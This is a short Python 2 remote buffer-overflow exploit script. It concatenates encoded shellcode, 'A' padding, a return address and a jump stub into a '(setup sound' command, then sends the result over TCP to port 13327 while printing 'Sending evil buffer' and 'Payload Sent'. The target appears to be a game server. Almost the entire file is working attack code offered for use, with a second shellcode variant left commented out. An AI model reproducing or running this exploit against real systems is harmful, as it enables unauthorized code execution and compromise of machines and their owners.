#!/usr/bin/python
import socket
host = "127.0.0.1"
#shellcode = ("\xd9\xed\xd9\x74\x24\xf4\xbb\xf8\xbc\x4b\xfa\x5d\x31\xc9\xb1"
#"\x14\x31\x5d\x19\x03\x5d\x19\x83\xc5\x04\x1a\x49\x7a\x21\x2d"
#"\x51\x2e\x96\x82\xfc\xd3\x91\xc5\xb1\xb2\x6c\x85\xe9\x64\x3d"
#"\xed\x0f\x99\xd0\xb1\x65\x89\x83\x19\xf3\x48\x49\xff\x5b\x46"
#"\x0e\x76\x1a\x5c\xbc\x8c\x2d\x3a\x0f\x0c\x0e\x73\xe9\xc1\x11"
#"\xe0\xaf\xb3\x2e\x5f\x9d\xc3\x18\x26\xe5\xab\xb5\xf7\x66\x43"
#"\xa2\x28\xeb\xfa\x5c\xbe\x08\xac\xf3\x49\x2f\xfc\xff\x84\x30")
shellcode = ("\xdb\xca\xba\x9b\x23\x7e\x15\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x14\x31\x50\x19\x03\x50\x19\x83\xc0\x04\x79\xd6\x4f\xce\x8a"
"\xfa\xe3\xb3\x27\x97\x01\xbd\x26\xd7\x60\x70\x28\x43\x33\xd8"
"\x40\x76\xcb\xcd\xcc\x1c\xdb\xbc\xbc\x69\x3a\x54\x5a\x32\x70"
"\x29\x2b\x83\x8e\x99\x2f\xb4\xe9\x10\xaf\xf7\x45\xcc\x62\x77"
"\x36\x48\x16\x47\x61\xa6\x66\xfe\xe8\xc0\x0e\x2e\x24\x42\xa6"
"\x58\x15\xc6\x5f\xf7\xe0\xe5\xcf\x54\x7a\x08\x5f\x51\xb1\x4b")
ret="\x97\x45\x13\x08"
crash=shellcode + "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90"
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
